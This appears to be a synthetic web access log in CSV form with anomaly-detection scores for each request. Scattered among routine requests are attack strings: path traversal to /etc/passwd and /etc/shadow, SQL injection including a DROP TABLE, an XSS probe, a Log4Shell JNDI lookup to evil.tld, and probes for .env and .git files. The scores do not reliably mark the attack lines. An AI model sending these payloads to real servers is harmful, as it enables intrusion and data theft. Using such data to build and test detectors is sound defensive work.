score_content,score_session,score_fused,score_fused_norm,line
69.46337890625,,69.46337890625,69.46337890625,100.143.229.198 - - [10/Jan/2025:12:02:46 +0100] "HEAD /search?q=phone HTTP/1.1" 200 13903 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
95.18338012695312,,95.18338012695312,95.18338012695312,205.195.229.38 - - [10/Jan/2025:12:02:47 +0100] "OPTIONS /api/product?id=123 HTTP/1.1" 200 13451 "https://news.ycombinator.com/" "curl/7.85.0"
49.36744689941406,,49.36744689941406,49.36744689941406,152.202.187.47 - - [10/Jan/2025:12:02:49 +0100] "DELETE /search?q=monitor HTTP/1.1" 200 5730 "https://example.com/" "curl/7.85.0"
11047.0888671875,,11047.0888671875,11047.0888671875,226.163.62.105 - - [10/Jan/2025:12:02:49 +0100] "POST /admin HTTP/1.1" 500 656 "https://example.com/" "dirb/2.22"
30214.919921875,,30214.919921875,30214.919921875,97.25.244.164 - - [10/Jan/2025:12:02:50 +0100] "TRACE /api/products HTTP/1.1" 403 553 "-" "sqlmap/1.7.2#stable"
73.49578857421875,,73.49578857421875,73.49578857421875,43.87.115.72 - - [10/Jan/2025:12:02:51 +0100] "OPTIONS /logout HTTP/1.1" 200 5989 "-" "python-requests/2.31.0"
26.516752243041992,,26.516752243041992,26.516752243041992,59.182.18.211 - - [10/Jan/2025:12:02:51 +0100] "POST /search?q=router HTTP/1.1" 200 19641 "-" "nikto/2.5.0"
30157.9140625,,30157.9140625,30157.9140625,241.135.57.238 - - [10/Jan/2025:12:02:51 +0100] "HEAD /contact HTTP/1.1" 403 693 "-" "Wget/1.21.2 (linux-gnu)"
69.42591857910156,,69.42591857910156,69.42591857910156,238.17.119.242 - - [10/Jan/2025:12:02:53 +0100] "HEAD /api/product?id=123 HTTP/1.1" 200 6873 "https://www.google.com/" "python-requests/2.31.0"
23.612937927246094,,23.612937927246094,23.612937927246094,192.94.207.232 - - [10/Jan/2025:12:02:53 +0100] "GET /search?q=ssd HTTP/1.1" 200 2074 "-" "curl/7.85.0"
95.14453887939453,,95.14453887939453,95.14453887939453,14.146.252.153 - - [10/Jan/2025:12:02:56 +0100] "OPTIONS /api/product?id=123 HTTP/1.1" 200 4664 "https://news.ycombinator.com/" "curl/7.85.0"
126.50065612792969,,126.50065612792969,126.50065612792969,208.54.4.227 - - [10/Jan/2025:12:02:57 +0100] "TRACE /search?q=headphones HTTP/1.1" 200 3667 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2573397755622864,,0.2573397755622864,0.2573397755622864,51.23.224.225 - - [10/Jan/2025:12:02:58 +0100] "GET /assets/app.css HTTP/1.1" 200 17788 "https://example.com/" "nikto/2.5.0"
126.69428253173828,,126.69428253173828,126.69428253173828,65.179.78.69 - - [10/Jan/2025:12:02:58 +0100] "TRACE /search?q=ssd HTTP/1.1" 200 17280 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
95.11762237548828,,95.11762237548828,95.11762237548828,43.10.152.85 - - [10/Jan/2025:12:02:59 +0100] "OPTIONS /search?q=monitor HTTP/1.1" 200 5596 "https://twitter.com/" "curl/7.85.0"
3.217268466949463,,3.217268466949463,3.217268466949463,13.201.207.73 - - [10/Jan/2025:12:03:01 +0100] "GET /assets/app.js HTTP/1.1" 304 7228 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
95.25527954101562,,95.25527954101562,95.25527954101562,148.148.196.76 - - [10/Jan/2025:12:03:01 +0100] "OPTIONS /search?q=ssd HTTP/1.1" 204 19775 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
49.41552734375,,49.41552734375,49.41552734375,243.102.26.137 - - [10/Jan/2025:12:03:01 +0100] "DELETE /search?q=laptop HTTP/1.1" 200 12107 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
26.51856231689453,,26.51856231689453,26.51856231689453,211.98.106.88 - - [10/Jan/2025:12:03:01 +0100] "POST /api/product?id=123 HTTP/1.1" 200 16670 "-" "python-requests/2.31.0"
35.10569763183594,,35.10569763183594,35.10569763183594,12.6.249.27 - - [10/Jan/2025:12:03:04 +0100] "PUT /api/product?id=123 HTTP/1.1" 200 9976 "https://news.ycombinator.com/" "python-requests/2.31.0"
103.29753112792969,,103.29753112792969,103.29753112792969,175.221.45.91 - - [10/Jan/2025:12:03:05 +0100] "TRACE /wp-login.php HTTP/1.1" 200 13126 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
0.345380574464798,,0.345380574464798,0.345380574464798,1.144.230.162 - - [10/Jan/2025:12:03:05 +0100] "GET /index.html HTTP/1.1" 200 13228 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
2.2371528148651123,,2.2371528148651123,2.2371528148651123,222.9.92.211 - - [10/Jan/2025:12:03:05 +0100] "GET / HTTP/1.1" 200 19292 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
49.4224739074707,,49.4224739074707,49.4224739074707,167.109.190.77 - - [10/Jan/2025:12:03:08 +0100] "DELETE /search?q=phone HTTP/1.1" 200 8626 "https://news.ycombinator.com/" "nikto/2.5.0"
126.58638000488281,,126.58638000488281,126.58638000488281,6.107.194.97 - - [10/Jan/2025:12:03:08 +0100] "TRACE /api/product?id=123 HTTP/1.1" 200 4802 "-" "curl/7.85.0"
13.307095527648926,,13.307095527648926,13.307095527648926,26.150.198.67 - - [10/Jan/2025:12:03:08 +0100] "PUT /api/products HTTP/1.1" 200 3032 "https://example.com/" "dirb/2.22"
76.57466125488281,,76.57466125488281,76.57466125488281,16.48.21.13 - - [10/Jan/2025:12:03:09 +0100] "OPTIONS /login HTTP/1.1" 304 18202 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.2410545349121094,,3.2410545349121094,3.2410545349121094,77.220.83.242 - - [10/Jan/2025:12:03:09 +0100] "GET /assets/app.css HTTP/1.1" 304 19962 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
126.56322479248047,,126.56322479248047,126.56322479248047,26.217.76.7 - - [10/Jan/2025:12:03:10 +0100] "TRACE /search?q=headphones HTTP/1.1" 200 19135 "-" "nikto/2.5.0"
1.9667168855667114,,1.9667168855667114,1.9667168855667114,164.150.137.60 - - [10/Jan/2025:12:03:13 +0100] "GET /logout HTTP/1.1" 200 12097 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
69.39942932128906,,69.39942932128906,69.39942932128906,114.118.102.151 - - [10/Jan/2025:12:03:16 +0100] "HEAD /search?q=router HTTP/1.1" 200 4273 "https://twitter.com/" "sqlmap/1.7.2#stable"
4.844484329223633,,4.844484329223633,4.844484329223633,232.245.31.125 - - [10/Jan/2025:12:03:16 +0100] "POST /contact HTTP/1.1" 200 15329 "https://example.com/" "curl/7.85.0"
29.392271041870117,,29.392271041870117,29.392271041870117,210.132.62.129 - - [10/Jan/2025:12:03:16 +0100] "POST /search?q=laptop HTTP/1.1" 302 2034 "https://news.ycombinator.com/" "nikto/2.5.0"
95.16271209716797,,95.16271209716797,95.16271209716797,59.128.215.78 - - [10/Jan/2025:12:03:17 +0100] "OPTIONS /search?q=router HTTP/1.1" 200 237 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
104.92636108398438,,104.92636108398438,104.92636108398438,142.231.73.169 - - [10/Jan/2025:12:03:20 +0100] "TRACE /contact HTTP/1.1" 200 13403 "-" "nikto/2.5.0"
27.835302352905273,,27.835302352905273,27.835302352905273,132.247.156.122 - - [10/Jan/2025:12:03:23 +0100] "DELETE /about HTTP/1.1" 200 18284 "https://www.google.com/" "nikto/2.5.0"
23.634050369262695,,23.634050369262695,23.634050369262695,19.54.209.111 - - [10/Jan/2025:12:03:23 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 14193 "-" "curl/7.85.0"
13.506285667419434,,13.506285667419434,13.506285667419434,207.174.123.242 - - [10/Jan/2025:12:03:24 +0100] "PUT /about HTTP/1.1" 200 12709 "https://www.google.com/" "python-requests/2.31.0"
69.44525909423828,,69.44525909423828,69.44525909423828,240.12.183.108 - - [10/Jan/2025:12:03:27 +0100] "HEAD /search?q=laptop HTTP/1.1" 200 14820 "https://www.google.com/" "python-requests/2.31.0"
23.597612380981445,,23.597612380981445,23.597612380981445,25.160.19.9 - - [10/Jan/2025:12:03:30 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 11142 "https://news.ycombinator.com/" "dirb/2.22"
4.864374160766602,,4.864374160766602,4.864374160766602,69.33.76.168 - - [10/Jan/2025:12:03:31 +0100] "GET /logout HTTP/1.1" 302 3256 "https://www.google.com/" "nikto/2.5.0"
47.85953140258789,,47.85953140258789,47.85953140258789,31.58.112.41 - - [10/Jan/2025:12:03:34 +0100] "HEAD /login HTTP/1.1" 200 19778 "https://twitter.com/" "sqlmap/1.7.2#stable"
72.35107421875,,72.35107421875,72.35107421875,2.203.54.114 - - [10/Jan/2025:12:03:37 +0100] "HEAD /search?q=router HTTP/1.1" 301 6695 "https://news.ycombinator.com/" "nikto/2.5.0"
0.259462833404541,,0.259462833404541,0.259462833404541,128.243.179.216 - - [10/Jan/2025:12:03:37 +0100] "GET /assets/app.css HTTP/1.1" 200 18476 "https://www.google.com/" "python-requests/2.31.0"
104.78411102294922,,104.78411102294922,104.78411102294922,139.60.51.242 - - [10/Jan/2025:12:03:38 +0100] "TRACE /phpmyadmin HTTP/1.1" 201 3229 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
11.685623168945312,,11.685623168945312,11.685623168945312,80.47.139.39 - - [10/Jan/2025:12:03:40 +0100] "PUT /../../etc/passwd HTTP/1.1" 200 6803 "-" "curl/7.85.0"
69.46034240722656,,69.46034240722656,69.46034240722656,178.147.180.31 - - [10/Jan/2025:12:03:43 +0100] "HEAD /search?q=camera HTTP/1.1" 200 19542 "https://twitter.com/" "sqlmap/1.7.2#stable"
27.81767463684082,,27.81767463684082,27.81767463684082,98.231.154.132 - - [10/Jan/2025:12:03:45 +0100] "DELETE /login HTTP/1.1" 200 13059 "-" "Wget/1.21.2 (linux-gnu)"
12.0152587890625,,12.0152587890625,12.0152587890625,243.95.144.209 - - [10/Jan/2025:12:03:47 +0100] "PUT /.env HTTP/1.1" 200 3146 "https://twitter.com/" "dirb/2.22"
4.773464679718018,,4.773464679718018,4.773464679718018,157.61.254.225 - - [10/Jan/2025:12:03:50 +0100] "GET /api/products HTTP/1.1" 302 8293 "-" "python-requests/2.31.0"
23.613183975219727,,23.613183975219727,23.613183975219727,32.184.149.184 - - [10/Jan/2025:12:03:51 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 8907 "-" "nikto/2.5.0"
4.8882269859313965,,4.8882269859313965,4.8882269859313965,13.214.209.231 - - [10/Jan/2025:12:03:52 +0100] "POST /admin HTTP/1.1" 200 8308 "https://twitter.com/" "curl/7.85.0"
30116.16796875,,30116.16796875,30116.16796875,15.105.110.174 - - [10/Jan/2025:12:03:53 +0100] "POST /api/products HTTP/1.1" 429 975 "https://news.ycombinator.com/" "python-requests/2.31.0"
30183.57421875,,30183.57421875,30183.57421875,227.177.184.54 - - [10/Jan/2025:12:03:55 +0100] "OPTIONS /about HTTP/1.1" 401 855 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
26.485027313232422,,26.485027313232422,26.485027313232422,39.94.196.178 - - [10/Jan/2025:12:03:57 +0100] "POST /search?q=laptop HTTP/1.1" 200 10478 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
26.391923904418945,,26.391923904418945,26.391923904418945,237.176.173.60 - - [10/Jan/2025:12:03:58 +0100] "POST /search?q=headphones HTTP/1.1" 200 5345 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.21200694143772125,,0.21200694143772125,0.21200694143772125,237.233.133.76 - - [10/Jan/2025:12:03:59 +0100] "GET /assets/app.css HTTP/1.1" 200 6256 "-" "python-requests/2.31.0"
26.48480796813965,,26.48480796813965,26.48480796813965,106.21.251.157 - - [10/Jan/2025:12:04:00 +0100] "POST /api/product?id=123 HTTP/1.1" 201 8328 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
69.4499740600586,,69.4499740600586,69.4499740600586,9.236.94.178 - - [10/Jan/2025:12:04:00 +0100] "HEAD /api/product?id=123 HTTP/1.1" 200 12471 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.1973588466644287,,3.1973588466644287,3.1973588466644287,75.120.21.238 - - [10/Jan/2025:12:04:01 +0100] "GET /assets/app.css HTTP/1.1" 302 18891 "https://www.google.com/" "dirb/2.22"
4.947751522064209,,4.947751522064209,4.947751522064209,9.254.160.165 - - [10/Jan/2025:12:04:04 +0100] "GET /login HTTP/1.1" 301 19686 "https://www.google.com/" "curl/7.85.0"
49.44735336303711,,49.44735336303711,49.44735336303711,88.47.11.7 - - [10/Jan/2025:12:04:04 +0100] "DELETE /api/product?id=123 HTTP/1.1" 200 17453 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
16.25089454650879,,16.25089454650879,16.25089454650879,184.179.229.75 - - [10/Jan/2025:12:04:05 +0100] "PUT /api/products HTTP/1.1" 302 1034 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
35.16358184814453,,35.16358184814453,35.16358184814453,166.175.137.188 - - [10/Jan/2025:12:04:05 +0100] "PUT /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 19821 "-" "sqlmap/1.7.2#stable"
103.22728729248047,,103.22728729248047,103.22728729248047,139.97.237.230 - - [10/Jan/2025:12:04:08 +0100] "TRACE /../../etc/passwd HTTP/1.1" 200 18574 "https://www.google.com/" "sqlmap/1.7.2#stable"
27.682706832885742,,27.682706832885742,27.682706832885742,20.66.107.129 - - [10/Jan/2025:12:04:09 +0100] "DELETE /api/products HTTP/1.1" 200 18644 "https://twitter.com/" "curl/7.85.0"
45.97525405883789,,45.97525405883789,45.97525405883789,138.121.252.30 - - [10/Jan/2025:12:04:10 +0100] "HEAD /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 17063 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
27.63744354248047,,27.63744354248047,27.63744354248047,49.158.99.16 - - [10/Jan/2025:12:04:13 +0100] "DELETE /dashboard HTTP/1.1" 200 3467 "-" "python-requests/2.31.0"
1.9316966533660889,,1.9316966533660889,1.9316966533660889,70.253.241.176 - - [10/Jan/2025:12:04:15 +0100] "GET /logout HTTP/1.1" 200 4491 "https://example.com/" "sqlmap/1.7.2#stable"
11.662667274475098,,11.662667274475098,11.662667274475098,68.182.53.119 - - [10/Jan/2025:12:04:18 +0100] "PUT /cgi-bin/test.cgi HTTP/1.1" 200 2169 "https://www.google.com/" "python-requests/2.31.0"
126.56041717529297,,126.56041717529297,126.56041717529297,131.231.214.243 - - [10/Jan/2025:12:04:19 +0100] "TRACE /search?q=headphones HTTP/1.1" 200 18206 "https://example.com/" "python-requests/2.31.0"
2.2301089763641357,,2.2301089763641357,2.2301089763641357,43.57.35.166 - - [10/Jan/2025:12:04:22 +0100] "GET / HTTP/1.1" 200 17016 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
47.755393981933594,,47.755393981933594,47.755393981933594,68.223.154.86 - - [10/Jan/2025:12:04:23 +0100] "HEAD /contact HTTP/1.1" 200 10360 "https://example.com/" "dirb/2.22"
129.64175415039062,,129.64175415039062,129.64175415039062,73.159.65.114 - - [10/Jan/2025:12:04:23 +0100] "TRACE /search?q=ssd HTTP/1.1" 301 19987 "https://twitter.com/" "python-requests/2.31.0"
26.447404861450195,,26.447404861450195,26.447404861450195,161.212.223.94 - - [10/Jan/2025:12:04:25 +0100] "POST /search?q=headphones HTTP/1.1" 200 19686 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
0.3297695815563202,,0.3297695815563202,0.3297695815563202,228.243.180.254 - - [10/Jan/2025:12:04:27 +0100] "GET /index.html HTTP/1.1" 200 9320 "https://news.ycombinator.com/" "dirb/2.22"
30111.123046875,,30111.123046875,30111.123046875,147.137.114.95 - - [10/Jan/2025:12:04:29 +0100] "GET /assets/app.js HTTP/1.1" 401 8 "https://www.google.com/" "curl/7.85.0"
69.44312286376953,,69.44312286376953,69.44312286376953,50.188.57.13 - - [10/Jan/2025:12:04:31 +0100] "HEAD /search?q=phone HTTP/1.1" 200 8824 "https://news.ycombinator.com/" "python-requests/2.31.0"
29.500642776489258,,29.500642776489258,29.500642776489258,4.227.200.145 - - [10/Jan/2025:12:04:34 +0100] "POST /search?q=ssd HTTP/1.1" 302 10301 "https://twitter.com/" "nikto/2.5.0"
23.53912925720215,,23.53912925720215,23.53912925720215,215.211.202.173 - - [10/Jan/2025:12:04:34 +0100] "GET /search?q=monitor HTTP/1.1" 200 5332 "https://twitter.com/" "python-requests/2.31.0"
126.6268081665039,,126.6268081665039,126.6268081665039,61.116.77.49 - - [10/Jan/2025:12:04:36 +0100] "TRACE /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 7004 "https://news.ycombinator.com/" "nikto/2.5.0"
0.2652084529399872,,0.2652084529399872,0.2652084529399872,54.224.145.176 - - [10/Jan/2025:12:04:39 +0100] "GET /assets/app.js HTTP/1.1" 204 14818 "-" "curl/7.85.0"
0.25922784209251404,,0.25922784209251404,0.25922784209251404,247.139.11.226 - - [10/Jan/2025:12:04:40 +0100] "GET /assets/app.js HTTP/1.1" 200 11640 "https://twitter.com/" "dirb/2.22"
47.69456481933594,,47.69456481933594,47.69456481933594,229.170.178.17 - - [10/Jan/2025:12:04:40 +0100] "HEAD /dashboard HTTP/1.1" 200 11301 "https://www.google.com/" "nikto/2.5.0"
1.8052196502685547,,1.8052196502685547,1.8052196502685547,172.117.173.129 - - [10/Jan/2025:12:04:40 +0100] "GET /api/products HTTP/1.1" 200 2795 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
35.186946868896484,,35.186946868896484,35.186946868896484,107.114.101.102 - - [10/Jan/2025:12:04:43 +0100] "PUT /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 204 2176 "https://example.com/" "python-requests/2.31.0"
11169.0234375,,11169.0234375,11169.0234375,78.231.98.112 - - [10/Jan/2025:12:04:46 +0100] "TRACE /search?q=phone HTTP/1.1" 500 735 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
13.524646759033203,,13.524646759033203,13.524646759033203,52.52.170.78 - - [10/Jan/2025:12:04:46 +0100] "PUT /about HTTP/1.1" 200 18021 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.193348407745361,,5.193348407745361,5.193348407745361,1.48.175.184 - - [10/Jan/2025:12:04:48 +0100] "GET / HTTP/1.1" 304 12495 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
38.18647766113281,,38.18647766113281,38.18647766113281,26.1.93.29 - - [10/Jan/2025:12:04:50 +0100] "PUT /search?q=ssd HTTP/1.1" 304 18345 "https://example.com/" "nikto/2.5.0"
0.2632701098918915,,0.2632701098918915,0.2632701098918915,64.15.220.69 - - [10/Jan/2025:12:04:51 +0100] "GET /assets/app.js HTTP/1.1" 200 12693 "-" "dirb/2.22"
23.567529678344727,,23.567529678344727,23.567529678344727,172.70.253.117 - - [10/Jan/2025:12:04:53 +0100] "GET /search?q=laptop HTTP/1.1" 200 7041 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.6814022064209,,27.6814022064209,27.6814022064209,140.235.149.35 - - [10/Jan/2025:12:04:53 +0100] "DELETE /dashboard HTTP/1.1" 200 13080 "https://news.ycombinator.com/" "dirb/2.22"
35.14236831665039,,35.14236831665039,35.14236831665039,81.51.111.55 - - [10/Jan/2025:12:04:53 +0100] "PUT /search?q=phone HTTP/1.1" 200 17426 "-" "python-requests/2.31.0"
52.251949310302734,,52.251949310302734,52.251949310302734,240.161.17.55 - - [10/Jan/2025:12:04:55 +0100] "DELETE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 302 11095 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
30160.005859375,,30160.005859375,30160.005859375,240.144.139.254 - - [10/Jan/2025:12:04:58 +0100] "DELETE /search?q=camera HTTP/1.1" 401 353 "https://example.com/" "python-requests/2.31.0"
30112.150390625,,30112.150390625,30112.150390625,240.200.192.126 - - [10/Jan/2025:12:05:01 +0100] "GET /about HTTP/1.1" 400 762 "https://twitter.com/" "dirb/2.22"
0.3362976908683777,,0.3362976908683777,0.3362976908683777,208.72.111.241 - - [10/Jan/2025:12:05:03 +0100] "GET /index.html HTTP/1.1" 200 10875 "https://www.google.com/" "sqlmap/1.7.2#stable"
0.24648012220859528,,0.24648012220859528,0.24648012220859528,250.44.25.197 - - [10/Jan/2025:12:05:06 +0100] "GET /assets/app.css HTTP/1.1" 200 14500 "https://example.com/" "python-requests/2.31.0"
72.38047790527344,,72.38047790527344,72.38047790527344,222.196.83.75 - - [10/Jan/2025:12:05:07 +0100] "HEAD /api/product?id=123 HTTP/1.1" 302 5948 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
126.64691925048828,,126.64691925048828,126.64691925048828,118.129.75.186 - - [10/Jan/2025:12:05:10 +0100] "TRACE /search?q=phone HTTP/1.1" 201 17849 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.21243959665298462,,0.21243959665298462,0.21243959665298462,228.75.88.124 - - [10/Jan/2025:12:05:10 +0100] "GET /assets/app.css HTTP/1.1" 200 417 "https://news.ycombinator.com/" "curl/7.85.0"
0.24420112371444702,,0.24420112371444702,0.24420112371444702,77.70.253.154 - - [10/Jan/2025:12:05:11 +0100] "GET /assets/app.css HTTP/1.1" 201 14350 "https://twitter.com/" "python-requests/2.31.0"
29.45404052734375,,29.45404052734375,29.45404052734375,126.139.154.86 - - [10/Jan/2025:12:05:11 +0100] "POST /api/product?id=123 HTTP/1.1" 302 13335 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
1.8512382507324219,,1.8512382507324219,1.8512382507324219,56.70.45.68 - - [10/Jan/2025:12:05:13 +0100] "GET /api/products HTTP/1.1" 200 12680 "https://www.google.com/" "python-requests/2.31.0"
46.136112213134766,,46.136112213134766,46.136112213134766,239.140.102.87 - - [10/Jan/2025:12:05:16 +0100] "HEAD /.git/config HTTP/1.1" 200 7440 "https://example.com/" "curl/7.85.0"
27.712425231933594,,27.712425231933594,27.712425231933594,206.28.202.105 - - [10/Jan/2025:12:05:16 +0100] "DELETE /profile HTTP/1.1" 200 5410 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
104.80895233154297,,104.80895233154297,104.80895233154297,129.167.154.200 - - [10/Jan/2025:12:05:18 +0100] "TRACE /api/products HTTP/1.1" 200 5261 "-" "curl/7.85.0"
23.817644119262695,,23.817644119262695,23.817644119262695,216.46.172.251 - - [10/Jan/2025:12:05:21 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 10282 "https://example.com/" "curl/7.85.0"
47.716331481933594,,47.716331481933594,47.716331481933594,148.173.230.179 - - [10/Jan/2025:12:05:21 +0100] "HEAD /contact HTTP/1.1" 200 2179 "-" "sqlmap/1.7.2#stable"
1.9250552654266357,,1.9250552654266357,1.9250552654266357,89.4.217.110 - - [10/Jan/2025:12:05:22 +0100] "GET /profile HTTP/1.1" 200 10473 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
4.7816081047058105,,4.7816081047058105,4.7816081047058105,235.223.126.156 - - [10/Jan/2025:12:05:25 +0100] "POST /contact HTTP/1.1" 204 1040 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
71.6546630859375,,71.6546630859375,71.6546630859375,233.54.58.232 - - [10/Jan/2025:12:05:26 +0100] "OPTIONS /..%2f..%2fetc%2fpasswd HTTP/1.1" 204 423 "-" "curl/7.85.0"
27.667816162109375,,27.667816162109375,27.667816162109375,166.230.129.98 - - [10/Jan/2025:12:05:27 +0100] "DELETE /api/products HTTP/1.1" 200 14114 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11047.08203125,,11047.08203125,11047.08203125,75.50.96.203 - - [10/Jan/2025:12:05:30 +0100] "POST /api/products HTTP/1.1" 502 614 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.588605880737305,,23.588605880737305,23.588605880737305,46.35.178.117 - - [10/Jan/2025:12:05:31 +0100] "GET /search?q=monitor HTTP/1.1" 200 17601 "https://twitter.com/" "dirb/2.22"
95.1200942993164,,95.1200942993164,95.1200942993164,59.84.85.44 - - [10/Jan/2025:12:05:32 +0100] "OPTIONS /search?q=router HTTP/1.1" 200 1341 "-" "Wget/1.21.2 (linux-gnu)"
35.086673736572266,,35.086673736572266,35.086673736572266,229.75.227.215 - - [10/Jan/2025:12:05:34 +0100] "PUT /search?q=laptop HTTP/1.1" 200 8360 "https://www.google.com/" "dirb/2.22"
76.41253662109375,,76.41253662109375,76.41253662109375,228.224.189.237 - - [10/Jan/2025:12:05:36 +0100] "OPTIONS /phpmyadmin HTTP/1.1" 304 19440 "-" "curl/7.85.0"
1.8127448558807373,,1.8127448558807373,1.8127448558807373,167.130.124.94 - - [10/Jan/2025:12:05:39 +0100] "GET /api/products HTTP/1.1" 200 4267 "-" "curl/7.85.0"
23.660633087158203,,23.660633087158203,23.660633087158203,67.90.180.169 - - [10/Jan/2025:12:05:42 +0100] "GET /search?q=ssd HTTP/1.1" 204 14133 "https://news.ycombinator.com/" "python-requests/2.31.0"
4.827630519866943,,4.827630519866943,4.827630519866943,225.249.171.128 - - [10/Jan/2025:12:05:45 +0100] "POST /contact HTTP/1.1" 200 10837 "https://example.com/" "sqlmap/1.7.2#stable"
104.91519165039062,,104.91519165039062,104.91519165039062,126.222.182.75 - - [10/Jan/2025:12:05:48 +0100] "TRACE /contact HTTP/1.1" 200 10536 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
